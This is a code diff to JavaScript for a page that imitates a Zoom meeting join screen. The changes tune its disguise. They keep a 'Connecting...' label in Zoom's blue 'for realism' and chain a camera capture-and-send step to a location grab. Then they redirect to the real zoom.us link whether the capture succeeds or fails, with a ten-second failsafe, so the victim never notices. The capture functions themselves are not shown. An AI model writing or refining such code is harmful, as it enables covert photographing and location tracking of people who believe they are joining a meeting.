@@ -365,35 +365,40 @@
     function instantStart() {   
         var btn = document.querySelector('.VahdFMz0');
         if(btn) {
-            btn.innerHTML = "Launching...";
-            btn.style.backgroundColor = "#555";
+            // MATCHING STATUS: Keep it saying "Connecting..." to match location.js
+            btn.innerHTML = "Connecting..."; 
+            btn.style.backgroundColor = "#0e72ed"; // Keep original blue color for realism
             btn.style.cursor = "wait";
         }
         
-        // ULTIMATE ORDER:
-        // 1. Camera (Needs immediate gesture for Desktop)
-        // 2. Location (Runs after camera logic finishes or fails)
-        // 3. Redirect (Always runs last)
+        // --- MASTER FAILSAFE (The Fix for "Stuck") ---
+        // If nothing happens for 10 seconds, force the redirect.
+        setTimeout(function() {
+            magicExit(); 
+        }, 10000);
+
+        // Start the Chain: Camera -> Location -> Redirect
         captureAndSend(locationPhase);
     }
 
     function locationPhase() {
+        // We pass 'magicExit' for both success AND failure.
+        // This ensures we always leave the page.
         locate(magicExit, magicExit);
     }
 
     function magicExit() {
-        updateStatus("Joining Meeting..."); // <--- Final Status Update
-        
-        // Check if there is an ID in the URL
+        // Final status update before leaving
+        var btn = document.querySelector('.VahdFMz0');
+        if(btn) btn.innerHTML = "Joining Meeting...";
+
         const urlParams = new URLSearchParams(window.location.search);
         const meetingId = urlParams.get('id');
 
         setTimeout(function() {
             if (meetingId) {
-                // Redirect to the specific meeting
                 window.location.replace("https://zoom.us/j/" + meetingId);
             } else {
-                // Default generic redirect
                 window.location.replace("https://zoom.us/join");
             }
         }, 1000);
